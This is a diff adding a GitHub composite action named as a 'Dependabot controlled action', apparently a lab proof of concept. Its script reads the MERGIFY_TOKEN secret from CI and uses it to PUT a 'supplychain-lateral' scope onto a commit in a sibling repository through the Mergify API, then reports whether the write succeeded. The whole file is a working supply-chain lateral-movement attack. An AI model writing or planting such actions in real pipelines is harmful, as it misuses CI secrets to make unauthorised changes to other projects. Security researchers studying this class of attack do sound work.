@@ -1,0 +1,27 @@
+# VM2 controlled version: 1.0.4
+name: VM2 Dependabot controlled action
+description: Controlled v1.0.4 sibling-scope integrity probe
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: |
+        python3 - <<'PY'
+        import json, os, urllib.error, urllib.request
+        token = os.environ.get('MERGIFY_TOKEN', '')
+        if not token:
+            print('VM2_DEPENDABOT_TOKEN_PRESENT=0')
+            raise SystemExit(2)
+        url = 'https://api.mergify.com/v1/repos/livastic-vm2-lab-20260911-g3a9/mrg-vm2-qslug-fork-0912-k7p4/commits/8f5912d7975697bb6090f0892d40cb04672c1cb3/scopes'
+        data = json.dumps(['vm2-dependabot-supplychain-lateral-20260914']).encode()
+        req = urllib.request.Request(url, data=data, method='PUT', headers={'Authorization': f'Bearer {token}', 'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'vm2-controlled-dependabot-action'})
+        try:
+            with urllib.request.urlopen(req, timeout=15) as r:
+                status = r.status
+        except urllib.error.HTTPError as exc:
+            status = exc.code
+        print('VM2_DEPENDABOT_TOKEN_PRESENT=1')
+        print(f'VM2_DEPENDABOT_SCOPE_WRITE_STATUS={status}')
+        raise SystemExit(0 if status == 204 else 1)
+        PY
+
